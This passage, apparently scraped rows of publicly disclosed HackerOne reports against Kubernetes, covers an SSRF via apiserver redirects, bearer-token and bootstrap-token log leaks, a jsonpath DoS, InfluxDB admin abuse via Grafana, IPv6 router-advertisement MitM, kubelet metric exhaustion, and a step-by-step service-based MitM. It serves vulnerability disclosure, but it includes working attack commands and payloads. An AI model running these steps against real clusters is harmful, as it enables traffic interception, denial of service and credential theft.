14        res.headers[""Content-Type""] = ""application/vnd.kubernetes.protobuf""
15        return res
16
17    return redirect('http://www.tencent.com/')
5.use kubectl proxy & start a apiserver proxy to localhost,and set klog level to 10. if not set klog level to 10 is can only recv http failed code response body.
Code 58 BytesWrap lines Copy Download1curl -XPUT --data ""10"" http://localhost:8001/debug/flags/v
6.now we can create a serviceaccount let apiserver to request our evil webserver use this command kubectl create sa testpoc.
Image F920762: pic2.png 160.79 KiBZoom in Zoom out Copy Download
7.use curl http://localhost:8001/logs/kube-apiserver.INFO to find full response body, is may be include Response Body: strings.
Image F920768: pic3.png 364.78 KiBZoom in Zoom out Copy Download
Supporting Material/References:

klog set to 10 root cause. https://github.com/kubernetes/client-go/blob/31e286ee1926a84e0bfd4c8c8c77b3816f98244a/rest/request.go#L1072
This link let our know gke is enabled logs handler https://groups.google.com/g/kubernetes-users/c/gHHhl0hI7GU

Impact
I think this case is like  CVE-2020–8555,  attacker can cause a full response body ssrf in cloudprovider inner server.
if redirect url is metadata server maybe can leak some credentials or other sensitive information.3 attachments:F920720: pic1.pngF920762: pic2.pngF920768: pic3.pngh1_analyst_leon HackerOne triage  posted a comment. Jul 24th (2 years ago)Hey @lazydog - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.h1_analyst_leon HackerOne triage  changed the status to Triaged. Jul 24th (2 years ago)Thank you @lazydog! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.h1_analyst_leon HackerOne triage  updated the severity from high (7.5) to high (7.7). Jul 24th (2 years ago)cji   updated the severity from high (7.7) to medium (6.8). Jul 27th (2 years ago)cji   updated CVE reference to CVE-2020-8561. Jul 27th (2 years ago)Kubernetes  rewarded lazydog with a $1,000 bounty. Jul 30th (2 years ago)lazydog   posted a comment. Oct 31st (2 years ago)Hi,
Any update on this? i found that 4 similar CVEs have been announced such as CVE-2020-8565 , maybe find that by CNCF based on this report?
best regards,
@lazydoglazydog   posted a comment. Jan 10th (2 years ago)Hi @cji,
Im not sure about this report processing, but if any update let me know.
I think this report eligible for a cve, so i provide some info.
credit info:
reporter credit: QiQi Xu (@lazydog177)
best regrads,
@lazydog mhausler Kubernetes staff  closed the report and changed the status to Resolved. Oct 7th (about 1 year ago)Thank you for this report! The issue has been made public without a fix https://groups.google.com/g/kubernetes-security-announce/c/RV2IhwcrQsYmhausler Kubernetes staff  requested to disclose this report. Oct 7th (about 1 year ago)mhausler Kubernetes staff  disclosed this report. Oct 7th (about 1 year ago)Marking as disclosed",https://hackerone.com/reports/941178,California,United States,San Francisco,2020,7,24,12,41
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,4.3,Cleartext Storage of Sensitive Information,CVE-2019-11250 remains in effect.,"purelyapplied  submitted a report to Kubernetes.Aug 6th (2 years ago)Report Submission Form
Summary:
""CVE-2019-11250: TOB-K8S-001: Bearer tokens are revealed in logs"" remains in effect.  
Kubernetes Version:
Effects at least all versions since 1.4.

This was determined with some git archaeology.  This was determined by following the code snippet from it's current location in kubernetes/staging/src/k8s.io/client-go/transport/round_trippers.go
The snippet was last meaningfully modified 
It's current location in The snippet remains relatively unchanged since 

Component Version:
I'm not sure.
Steps To Reproduce:

Spin up a cluster with high verbosity: klog.V(9).Enabled()
Watch logs  round_trippers.go curl -k -v -X<> -H ""Authorization: <token>"" <...>

I was having trouble getting a cluster spun up, so I have not managed a live reproduction.
Supporting Material/References:
[Issue #81146: Kubernetes 3rd Party Security Audit Findings]
(https://github.com/kubernetes/kubernetes/issues/81146)
[Issue  #81114: CVE-2019-11250: TOB-K8S-001: Bearer tokens are revealed in logs]
(https://github.com/kubernetes/kubernetes/issues/81114)
[Partial fix for #81114: PR #81330]
(https://github.com/kubernetes/kubernetes/pull/81330).
Note that only debuggingRoundTripper.RoundTrip only masks headers in the if rt.levels[debugRequestHeaders] block, exposure is also present in the
if rt.levels[debugCurlCommand] {klog.Infof(""%s"", reqInfo.toCurl())} preceding it.
At kubernetes/staging/src/k8s.io/client-go/transport/round_trippers.go:416:
Code 560 BytesWrap lines Copy Download1func (rt *debuggingRoundTripper) RoundTrip(req *http.Request) (*http.Response, error) {
2	reqInfo := newRequestInfo(req)
3
4	if rt.levels[debugJustURL] {
5		klog.Infof(""%s %s"", reqInfo.RequestVerb, reqInfo.RequestURL)
6	}
7	if rt.levels[debugCurlCommand] {
8		klog.Infof(""%s"", reqInfo.toCurl())
9	}
10	if rt.levels[debugRequestHeaders] {
11		klog.Infof(""Request Headers:"")
12		for key, values := range reqInfo.RequestHeaders {
13			for _, value := range values {
14				value = maskValue(key, value)
15				klog.Infof(""    %s: %s"", key, value)
16			}
17		}
18	}
19	// <function continues>
20}
At kubernetes/staging/src/k8s.io/client-go/transport/round_trippers.go:338:
Code 385 BytesWrap lines Copy Download1// toCurl returns a string that can be run as a command in a terminal (minus the body)
2func (r *requestInfo) toCurl() string {
3	headers := """"
4	for key, values := range r.RequestHeaders {
5		for _, value := range values {
6			headers += fmt.Sprintf(` -H %q`, fmt.Sprintf(""%s: %s"", key, value))
7		}
8	}
9
10	return fmt.Sprintf(""curl -k -v -X%s %s '%s'"", r.RequestVerb, headers, r.RequestURL)
11}
Correction will be a one-line diff to use maskValue in this loop as well.
Impact

Alice logs into a Kubernetes cluster and is issued a Bearer token. The system logs her
token. Eve, who has access to the logs but not the production Kubernetes cluster, replays
Alice’s Bearer token, and can masquerade as Alice to the cluster.",https://hackerone.com/reports/952771,California,United States,San Francisco,2020,8,6,17,42
Kubernetes,251-500,0.0,200m-1b,$200.00,Low,2.0,Denial of Service,DoS for client-go jsonpath func,"lazydog  submitted a report to Kubernetes.May 26th (2 years ago)Summary:
jsonpath recursive descent  cause a DoS vul
kubectl apiextensions-apiserver cli-runtime and kubernetes is depends on client-go
I think evalRecursive() cause of this vulnerability
function pos: client-go/util/jsonpath/jsonpath.go:451
Component Version:
client-go:master
Steps To Reproduce:
i written a simple fuzz based on  go-fuzz, im so lucky to found a crasher.

pull the latest kubernetes code 

Code 50 BytesWrap lines Copy Download1git clone https://github.com/kubernetes/kubernetes
  2.change workdir to  kubernetes/staging/src/k8s.io/client-go/util/jsonpath
3.copy this poc to disk use vim or cat, change filename to crash_tests.go
Code 1.94 KiBWrap lines Copy Download1package jsonpath
2
3import (
4	""testing""
5 	""bytes""
6 	""encoding/json""
7)
8
9type jsonpathcrashTest struct {
10 name     string
11 template string
12 input    interface{}
13}
14
15func FuzzParse(test *jsonpathcrashTest, allowMissingKeys bool) error {
16
17 j := New(test.name)
18
19 j.AllowMissingKeys(allowMissingKeys)
20 err := j.Parse(test.template)
21 if err != nil {
22  return err
23 }
24
25 buf := new(bytes.Buffer)
26 err = j.Execute(buf, test.input)
27 if err != nil {
28  return err
29 }
30
31 return err
32}
33
34func Fuzz(data []byte) int {
35 var input = []byte(`{
36  ""kind"": ""List"",
37  ""items"":[
38    {
39   ""kind"":""None"",
40   ""metadata"":{
41     ""name"":""127.0.0.1"",
42     ""labels"":{
43    ""kubernetes.io/hostname"":""127.0.0.1""
44     }
45   },
46   ""status"":{
47     ""capacity"":{""cpu"":""4""},
48     ""ready"": true,
49     ""addresses"":[{""type"": ""LegacyHostIP"", ""address"":""127.0.0.1""}]
50   }
51    },
52    {
53   ""kind"":""None"",
54   ""metadata"":{
55     ""name"":""127.0.0.2"",
56     ""labels"":{
57    ""kubernetes.io/hostname"":""127.0.0.2""
58     }
59   },
60   ""status"":{
61     ""capacity"":{""cpu"":""8""},
62     ""ready"": false,
63     ""addresses"":[
64    {""type"": ""LegacyHostIP"", ""address"":""127.0.0.2""},
65    {""type"": ""another"", ""address"":""127.0.0.3""}
66     ]
67   }
68    }
69  ],
70  ""users"":[
71    {
72   ""name"": ""myself"",
73   ""user"": {}
74    },
75    {
76   ""name"": ""e2e"",
77   ""user"": {""username"": ""admin"", ""password"": ""secret""}
78   }
79  ]
80   }`)
81
82 var nodesData interface{}
83 err := json.Unmarshal(input, &nodesData)
84 if err != nil {
85  print(err)
86 }
87
88 fuzzData := string(data)
89
90 test := jsonpathcrashTest{name: ""crash"", template: fuzzData, input: nodesData}
91
92 err = FuzzParse(&test, false)
93 if err != nil {
94  return 0
95 }
96
97 err = FuzzParse(&test, true)
98 if err != nil {
99  return 0
100 }
101
102 return 1
103}
104
105
106func TestCrash(t *testing.T) {
107	var data = []byte(""{..................."" +
108	""...................."" +
109	""...................."" +
110	""...................."" +
111	""...................."" +
112	""...................."" +
113	""...................."" +
114	""...................."" +
115	""...................."" +
116	""..........51}."")
117	Fuzz(data)
118}
119
4.run go test command, now we can see the test process use a lot of cpu and memeory
Image F843537: DoS_1.png 105.06 KiBZoom in Zoom out Copy Download
5.i found a real case in kubectl, if resource (like services pods node) has any record can cause DoS.
Code 170 BytesWrap lines Copy Download1kubectl get services -o=jsonpath=""{.....................................................................................................................................}""
Image F843557: DoS_2.png 64.23 KiBZoom in Zoom out Copy Download
Impact
maybe in some scenes, attacker can cause DoS.
eg. cloud components use client-go util to process cluster resouce json record.
any other program exec  kubectl  with jsonpath options, and jsonpath params by user control.2 attachments:F843537: DoS_1.pngF843557: DoS_2.png",https://hackerone.com/reports/882923,California,United States,San Francisco,2020,5,26,15,31
Kubernetes,251-500,0.0,200m-1b,$100.00,Low,2.0,Improper Authorization,Grafana Improper authorization ,"lazydog  submitted a report to Kubernetes.Feb 21st (3 years ago)Summary:
new report from part2.
wrong configuration causes Grafana datasource to use root user(with influxdb admin priv).
Component Version:
test-infra:master
Steps To Reproduce:
in normally configuration read-only user used by grafana, but in my test i found datasource user wite admin perms.
refer: https://github.com/kubernetes/test-infra/blob/master/velodrome/grafana-stack/datasource.sh
so i think maybe other scripts make this problem.
open url http://velodrome.k8s.io/, find the follwing requests:
Code 1.10 KiBWrap lines Copy Download1GET /api/datasources/proxy/4/query?db=metrics&q=SELECT%20%0A%20%201-(sum(%22consistent_builds%22)%2Fsum(%22builds%22))%0AFROM%0A%20%20%22flakes_daily%22%20%0AWHERE%20%0A%20%20time%20%3E%20now()%20-%2030d%0A%20%20AND%20%22job%22%20%3D~%20%2F%5E(pr%3Apull-kubernetes-kubemark-e2e-gce-big%7Cpr%3Apull-kubernetes-bazel-build%7Cpr%3Apull-kubernetes-bazel-test%7Cpr%3Apull-kubernetes-dependencies%7Cpr%3Apull-kubernetes-e2e-gce%7Cpr%3Apull-kubernetes-e2e-gce-100-performance%7Cpr%3Apull-kubernetes-e2e-kind%7Cpr%3Apull-kubernetes-integration%7Cpr%3Apull-kubernetes-node-e2e%7Cpr%3Apull-kubernetes-typecheck%7Cpr%3Apull-kubernetes-verify)%24%2F%0Agroup%20by%20job%2C%20time(20m)%20fill(none)&epoch=ms HTTP/1.1
2Host: velodrome.k8s.io
3Accept: application/json, text/plain, */*
4X-Grafana-Org-Id: 1
5User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54
6Referer: http://velodrome.k8s.io/dashboard/db/job-health-merge-blocking?orgId=1
7Accept-Encoding: gzip, deflate
8Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
9Connection: close
By trying I found that this datasource is incorrectly configured with a user.
we can use admin perms user throuth proxy access Influxdb.
so I use this vuln, created a admin user.
Image F724548: createuser.jpg 79.88 KiBZoom in Zoom out Copy Download
execute show databases, we found that we have admin permissions
Image F724549: withadminperms.jpg 84.19 KiBZoom in Zoom out Copy Download
Impact
maybe denial of service this component ,because admin can drop all Influxdb database.2 attachments:F724548: createuser.jpgF724549: withadminperms.jpg",https://hackerone.com/reports/802011,California,United States,San Francisco,2020,2,21,18,58
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.0,Man-in-the-Middle,IPv4 only clusters susceptible to MitM attacks via IPv6 rogue router advertisements,"champtar  submitted a report to Kubernetes.Mar 15th (3 years ago)This bug report mostly concerns the default CNI plugins (https://github.com/containernetworking/plugins) but I believe affects many K8S clusters.
Because the CNI team still doesn’t provide an explicit way to report security bugs, I hope the K8S security team doesn’t mind doing the coordination job again as was done for CVE-2019-9946.
I understand this is out of scope for this bounty, and I understand if you want to close this report and prefer that I resend it via email to security@kubernetes.io or other.
Summary:
In many K8S network configurations the container network interface is a virtual ethernet link going to the host (veth interface). In this configuration, an attacker able to run a process as root in a container can send and receive arbitrary packets to the host using the CAP_NET_RAW capability (present in default configuration).
In a K8S cluster with an IPv4 internal network, if IPv6 is not totally disabled on the host (via ipv6.disable=1 on the kernel cmdline), it will be either unconfigured or configured on some interfaces, but it’s pretty likely that ipv6 forwarding is disabled, ie /proc/sys/net/ipv6/conf//forwarding == 0. Also by default, /proc/sys/net/ipv6/conf//accept_ra == 1. The combination of these 2 sysctls means that the host accepts router advertisements and configure the IPv6 stack using them.
By sending “rogue” router advertisements, an attacker can reconfigure the host to redirect part or all of the IPv6 traffic of the host to the attacker controlled container.
Even if there was no IPv6 traffic before, if the DNS returns A (IPv4) and AAAA (IPv6) records, many HTTP libraries will try to connect via IPv6 first then fallback to IPv4, giving an opportunity to the attacker to respond.
If by chance you also have on the host a vulnerability like last year’s RCE in apt (CVE-2019-3462), you can now escalate to the host.
As CAP_NET_ADMIN is not present by default in K8S pods, the attacker can’t configure the IPs they want to MitM, they can’t use iptables to NAT or REDIRECT the traffic, and they can’t use IP_TRANSPARENT. The attacker can however still use CAP_NET_RAW and implement a tcp/ip stack in user space.
This report includes a POC based on smoltcp (https://github.com/smoltcp-rs/smoltcp) that sends router advertisements and implements a dummy HTTP server listening on any IPv6 addresses.
This vulnerability can easily be fixed by setting accept_ra = 0 by default on any interface managed by CNI / K8S.
Kubernetes Version:
Reproduced on:
GKE Cos 1.14.10-gke.17 with native VPC
GKE Cos 1.16.6-gke.12 with/without native VPC
GKE Cos + containerd 1.16.6-gke.12 without native VPC
Kubespray k8s 1.17.3 + containerd
Component Version:
CNI 0.7.5
Steps To Reproduce:
Please find attached ipv6mitm.cast (F748694), a recording of my shell using asciinema (https://github.com/asciinema/asciinema)
The GKE cluster used was created using the following command:
gcloud beta container --project ""copper-frame-263204"" clusters create ""testipv6"" --zone ""us-central1-c"" --no-enable-basic-auth --release-channel ""rapid"" --machine-type ""n1-standard-1"" --image-type ""COS"" --disk-type ""pd-standard"" --disk-size ""100"" --metadata disable-legacy-endpoints=true --scopes ""https://www.googleapis.com/auth/devstorage.read_only"",""https://www.googleapis.com/auth/logging.write"",""https://www.googleapis.com/auth/monitoring"",""https://www.googleapis.com/auth/servicecontrol"",""https://www.googleapis.com/auth/service.management.readonly"",""https://www.googleapis.com/auth/trace.append"" --num-nodes ""3"" --enable-stackdriver-kubernetes --no-enable-ip-alias --network ""projects/copper-frame-263204/global/networks/default"" --subnetwork ""projects/copper-frame-263204/regions/us-central1/subnetworks/default"" --no-enable-master-authorized-networks --addons HorizontalPodAutoscaling,HttpLoadBalancing --enable-autoupgrade --enable-autorepair
This cluster is created without --enable-ip-alias (but the attack also with it)
Supporting Material/References:
ipv6mitm.tar.xz (F748693): rust source code for the POC
ipv6mitm.cast (F748694): asciinema recording
Impact
An attacker able to run arbitrary code as root inside of a container can MitM part of the host’s traffic. This vulnerability if chained with other vulnerability like last year’s RCE in apt (CVE-2019-3462) could allow to escalate to the host.2 attachments:F748693: ipv6mitm.tar.xzF748694: ipv6mitm.castSummary by champtarWrite up available at https://blog.champtar.fr/IPv6_RA_MITM/",https://hackerone.com/reports/819717,California,United States,San Francisco,2020,3,15,17,34
Kubernetes,251-500,0.0,200m-1b,$200.00,Low,3.4,Insufficiently Protected Credentials,kubeadm logs tokens before deleting them,"mlevesquedion  submitted a report to Kubernetes.Sep 1st (2 years ago)Report Submission Form
Summary:
kubeabdm's delete command takes as input either a bootstrap token ID, or a full token. Before determining whether the input is just an id or a full token, kubeadm logs the input using klog. If the deletion fails, the token would remain valid. An attacker who has access to the logs could use it to perform actions that require a bootstrap token, such as creating a cluster or joining nodes to an existing cluster.
Kubernetes Version:
The vulnerable code is present in kubernetes 1.19. The specific line that contains the call to klog was last edited on 2019-03-24.
Steps To Reproduce:
The vulnerable code is in the github.com/kubernetes repository, under kubernetes/cmd/kubeadm/app/cmd/token.go, at line 423. Here is the whole function:
Code 1.23 KiBWrap lines Copy Download1// RunDeleteTokens removes a bootstrap tokens from the server.
2func RunDeleteTokens(out io.Writer, client clientset.Interface, tokenIDsOrTokens []string) error {
3	for _, tokenIDOrToken := range tokenIDsOrTokens {
4		// Assume this is a token id and try to parse it
5		tokenID := tokenIDOrToken
6		klog.V(1).Infof(""[token] parsing token %q"", tokenIDOrToken) // POTENTIAL LEAK HERE
7		if !bootstraputil.IsValidBootstrapTokenID(tokenIDOrToken) {
8			// Okay, the full token with both id and secret was probably passed. Parse it and extract the ID only
9			bts, err := kubeadmapiv1beta2.NewBootstrapTokenString(tokenIDOrToken)
10			if err != nil {
11				return errors.Errorf(""given token %q didn't match pattern %q or %q"",
12					tokenIDOrToken, bootstrapapi.BootstrapTokenIDPattern, bootstrapapi.BootstrapTokenIDPattern)
13			}
14			tokenID = bts.ID
15		}
16
17		tokenSecretName := bootstraputil.BootstrapTokenSecretName(tokenID)
18		klog.V(1).Infof(""[token] deleting token %q"", tokenID)
19		if err := client.CoreV1().Secrets(metav1.NamespaceSystem).Delete(context.TODO(), tokenSecretName, metav1.DeleteOptions{}); err != nil {
20			return errors.Wrapf(err, ""failed to delete bootstrap token %q"", tokenID)
21		}
22		fmt.Fprintf(out, ""bootstrap token %q deleted\n"", tokenID)
23	}
24	return nil
25}
And here's the definition of the kubeadm command that calls that function:
Code 835 BytesWrap lines Copy Download1	deleteCmd := &cobra.Command{
2		Use:                   ""delete [token-value] ..."",
3		DisableFlagsInUseLine: true,
4		Short:                 ""Delete bootstrap tokens on the server"",
5		Long: dedent.Dedent(`
6			This command will delete a list of bootstrap tokens for you.
7
8			The [token-value] is the full Token of the form ""[a-z0-9]{6}.[a-z0-9]{16}"" or the
9			Token ID of the form ""[a-z0-9]{6}"" to delete.
10		`),
11		RunE: func(tokenCmd *cobra.Command, args []string) error {
12			if len(args) < 1 {
13				return errors.Errorf(""missing subcommand; 'token delete' is missing token of form %q"", bootstrapapi.BootstrapTokenIDPattern)
14			}
15			kubeConfigFile = cmdutil.GetKubeConfigPath(kubeConfigFile)
16			client, err := getClientset(kubeConfigFile, dryRun)
17			if err != nil {
18				return err
19			}
20
21			return RunDeleteTokens(out, client, args)
22		},
23	}
Supporting Material/References:
None.
Impact
An attacker who obtains a bootstrap token from the logs could use it to authenticate with kubeadm and create a new cluster or join nodes to an existing cluster, e.g. to use computing resources. An attacker could also perform other actions using kubeadm, e.g. listing or deleting other tokens.",https://hackerone.com/reports/972561,California,United States,San Francisco,2020,9,1,23,15
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,5.0,Denial of Service,Kubelet resource exhaustion attack via metric label cardinality explosion from unauthenticated requests,"mr_incompetent  submitted a report to Kubernetes.Jan 14th (3 years ago)Report Submission Form
Summary:
Malicious clients can potentially DOS a kubelet by sending a high amount of specially crafted requests to the kubelet's HTTP server. 
For each request the kubelet updates/sets 3 metrics:

kubelet_http_requests_total (Counter)
kubelet_http_requests_duration_seconds (Histogram with 7 buckets)
kubelet_http_inflight_requests (Counter)

Each metric has the label path which will contain the path of each request.
It does not matter if the request is authenticated or not - The metrics will be set/updated regardless.
With each unique path, the kubelet creates 16 new time series.
By sending a high amount of requests with random path values, the kubelet's memory usage will grow and eventually the kubelet will get OOM killed.
It's also possible that the kubelet evicts all workloads before being OOM killed (Which might be worse than an OOM kill) 
The corresponding kubelet server code: https://github.com/kubernetes/kubernetes/blob/v1.17.0/pkg/kubelet/server/server.go#L859-L865
Kubernetes Version:

v1.17.0 kubeadm (tested)
v1.16.4 kubeadm (tested)
v1.15.7 kubeadm (tested)

Component Version:
Kubelet
Steps To Reproduce:
Code 661 BytesWrap lines Copy Download1NODE_NAME=""my-poor-node""
2NODE_IP=""192.168.1.100""
3
4# Perform random requests from an unauthenticated client
5curl --insecure https://${NODE_IP}:10250/foo
6curl --insecure https://${NODE_IP}:10250/bar
7curl --insecure https://${NODE_IP}:10250/baz
8
9# Run in a dedicated shell to be able to get the metrics
10kubectl proxy
11
12# Load metrics from node
13# For each path (foo, bar, baz) 16 time series got created
14curl http://127.0.0.1:8001/api/v1/nodes/${NODE_NAME}/proxy/metrics 2>&1 | grep 'kubelet_http_requests_total\|kubelet_http_requests_duration_seconds\|kubelet_http_inflight_requests'
15
16# Perform more random requests & see the output of the metrics endpoint to grow.
Supporting Material/References:
A gist with an additional go tool which spams the kubelet
https://gist.github.com/mrIncompetent/c6cbe483298c36668374363baf52a35d
Impact
Kill the kubelet / Make the kubelet consume all resources so it starts to evict pods.",https://hackerone.com/reports/774896,California,United States,San Francisco,2020,1,14,18,1
Kubernetes,251-500,0.0,200m-1b,"$1,000.00",Medium,6.6,Man-in-the-Middle,Man in the middle using LoadBalancer or ExternalIPs services,"champtar  submitted a report to Kubernetes.Dec 27th (3 years ago)I rated this vulnerability as high because trying to rate it with CVSS v3.0 Calculator gives me 9.9 which seems way too high  as you do require to be able to create services in the K8S cluster.
Summary:
This report details 2 ways to man in the middle traffic by:
a) creating a LoadBalancer service and patching the status with the attacked IP
b) creating a ClusterIP service with ExternalIPs set to the attacked IP
For these 2 options, we explore:
1) MITM of IPs external to the cluster (ex: 1.1.1.1)
2) MITM of ClusterIP IP
3) MITM of pod IP
4) MITM of 127.0.0.1
This gives us 8 test cases, that I tested with kube-proxy mode IPVS, iptables, and a GKE cluster (if you need an easier repro than kubespray deployments)
Results are: Image F669473: Capture_d__cran_du_2019-12-26_20-20-23.png 48.20 KiBZoom in Zoom out Copy Download
Kubernetes Version:
Code 66 BytesWrap lines Copy Download1v1.16.3 deployed using kubespray
21.15.4-gke.22 for the GKE cluster
Component Version:
Test cluster deployed on top of CentOS7 using kubespray v2.12.0
Code 925 BytesWrap lines Copy Download1container_manager: containerd
2etcd_deployment_type: host
3kube_proxy_mode: ipvs OR kube_proxy_mode: iptables
4
5# kubectl get nodes -o wide
6NAME            STATUS   ROLES    AGE   VERSION   INTERNAL-IP    EXTERNAL-IP   OS-IMAGE                KERNEL-VERSION               CONTAINER-RUNTIME
7etienne-ks141   Ready    master   48m   v1.16.3   10.10.52.141   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10
8etienne-ks142   Ready    master   47m   v1.16.3   10.10.52.142   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10
9etienne-ks143   Ready    <none>   45m   v1.16.3   10.10.52.143   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10
10etienne-ks144   Ready    <none>   45m   v1.16.3   10.10.52.144   <none>        CentOS Linux 7 (Core)   3.10.0-1062.9.1.el7.x86_64   containerd://1.2.10
11
12Calico 3.7.3
13CNI plugin 0.8.1
Steps To Reproduce:
We assume that you already have a working k8s cluster
### 0) prepare our tests
Deploy ""victim-client"" pod to simulate an in-cluster HTTP client with curl
Code 200 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Pod
4metadata:
5  name: victim-client
6spec:
7  containers:
8    - name: curl
9      image: curlimages/curl:7.67.0
10      command: [ ""/bin/sleep"", ""3600"" ]
11EOF
Check that we have access to our external victim (here 1.1.1.1)
Code 192 BytesWrap lines Copy Download1# from a node
2curl -sv http://1.1.1.1
3curl -sv https://1.1.1.1 -k
4# from the pod
5kubectl exec victim-client -- curl -sv http://1.1.1.1
6kubectl exec victim-client -- curl -sv https://1.1.1.1 -k
Deploy our ""mitm pod""
Code 554 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Namespace
4metadata:
5  name: kubeproxy-mitm
6---
7apiVersion: apps/v1
8kind: Deployment
9metadata:
10  name: echoserver
11  namespace: kubeproxy-mitm
12spec:
13  replicas: 1
14  selector:
15    matchLabels:
16      app: echoserver
17  template:
18    metadata:
19      labels:
20        app: echoserver
21    spec:
22      containers:
23      - image: gcr.io/google_containers/echoserver:1.10
24        name: echoserver
25        ports:
26        - name: http
27          containerPort: 8080
28        - name: https
29          containerPort: 8443
30EOF
### 1a) external traffic interception using service type LoadBalancer
Deploy the MITM
Code 592 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-external-lb
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: http
10    port: 80
11    targetPort: 8080
12  - name: https
13    port: 443
14    targetPort: 8443
15  selector:
16    app: echoserver
17  type: LoadBalancer
18EOF
19kubectl proxy --port=8080 &
20sleep 3
21curl -k -v -XPATCH  -H ""Accept: application/json"" -H ""Content-Type: application/merge-patch+json"" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-external-lb/status' -d '{""status"":{""loadBalancer"":{""ingress"":[{""ip"":""1.1.1.1""}]}}}'
22pkill kubectl
After the patch call, LoadBalancer IP is properly configured (ie not pending)
Code 246 BytesWrap lines Copy Download1kubectl get -n kubeproxy-mitm svc/mitm-external-lb
2# NAME               TYPE           CLUSTER-IP     EXTERNAL-IP   PORT(S)                      AGE
3# mitm-external-lb   LoadBalancer   10.233.53.58   1.1.1.1       80:31475/TCP,443:31258/TCP   47s
Test if the MITM works
Code 188 BytesWrap lines Copy Download1# node -> ip
2curl -sv http://1.1.1.1
3curl -sv https://1.1.1.1 -k
4# pod -> ip
5kubectl exec victim-client -- curl -sv http://1.1.1.1
6kubectl exec victim-client -- curl -sv https://1.1.1.1 -k
Cleanup
Code 53 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-external-lb
### 1b) external traffic interception using service type ClusterIP + externalIPs
Deploy the MITM
Code 317 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-external-eip
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: http
10    port: 80
11    targetPort: 8080
12  - name: https
13    port: 443
14    targetPort: 8443
15  selector:
16    app: echoserver
17  type: ClusterIP
18  externalIPs:
19    - 1.1.1.1
20EOF
Test if the MITM works
Code 188 BytesWrap lines Copy Download1# node -> ip
2curl -sv http://1.1.1.1
3curl -sv https://1.1.1.1 -k
4# pod -> ip
5kubectl exec victim-client -- curl -sv http://1.1.1.1
6kubectl exec victim-client -- curl -sv https://1.1.1.1 -k
Cleanup
Code 54 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-external-eip
### 2a) k8s service traffic interception using service type LoadBalancer
Find a service to attack, in my testing I chose kubernetes-dashboard
Code 212 BytesWrap lines Copy Download1kubectl get -n kube-system svc/kubernetes-dashboard
2# NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE
3# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   87m
Test if the service is working
Code 136 BytesWrap lines Copy Download1# node -> clusterIP
2curl -sv https://10.233.36.240 -k
3# pod -> clusterIP
4kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
Deploy the MITM
Code 565 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-service-lb
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: https
10    port: 443
11    protocol: TCP
12    targetPort: 8443
13  selector:
14    app: echoserver
15  type: LoadBalancer
16EOF
17kubectl proxy --port=8080 &
18sleep 3
19curl -k -v -XPATCH  -H ""Accept: application/json"" -H ""Content-Type: application/merge-patch+json"" 'http://127.0.0.1:8080/api/v1/namespaces/kubeproxy-mitm/services/mitm-service-lb/status' -d '{""status"":{""loadBalancer"":{""ingress"":[{""ip"":""10.233.36.240""}]}}}'
20pkill kubectl
Test if the MITM works
Code 136 BytesWrap lines Copy Download1# node -> clusterIP
2curl -sv https://10.233.36.240 -k
3# pod -> clusterIP
4kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
Cleanup
Code 52 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-service-lb
### 2b) k8s service traffic interception using service type ClusterIP + externalIPs
Find a service to attack, in my testing I chose kubernetes-dashboard
Code 212 BytesWrap lines Copy Download1kubectl get -n kube-system svc/kubernetes-dashboard
2# NAME                   TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)   AGE
3# kubernetes-dashboard   ClusterIP   10.233.36.240   <none>        443/TCP   87m
Test if the service is working before the MITM
Code 136 BytesWrap lines Copy Download1# node -> clusterIP
2curl -sv https://10.233.36.240 -k
3# pod -> clusterIP
4kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
Deploy the MITM
Code 291 BytesWrap lines Copy Download1kubectl apply -f - <<'EOF'
2apiVersion: v1
3kind: Service
4metadata:
5  name: mitm-service-eip
6  namespace: kubeproxy-mitm
7spec:
8  ports:
9  - name: https
10    port: 443
11    protocol: TCP
12    targetPort: 8443
13  selector:
14    app: echoserver
15  type: ClusterIP
16  externalIPs:
17    - 10.233.36.240
18EOF
Test if MITM works
Code 136 BytesWrap lines Copy Download1# node -> clusterIP
2curl -sv https://10.233.36.240 -k
3# pod -> clusterIP
4kubectl exec victim-client -- curl -sv https://10.233.36.240 -k
Cleanup
Code 53 BytesWrap lines Copy Download1kubectl delete -n kubeproxy-mitm svc/mitm-service-eip
### 3a) k8s pod traffic interception using service type LoadBalancer
Find a service to attack + its endpoints, in my testing I chose kubernetes-dashboard
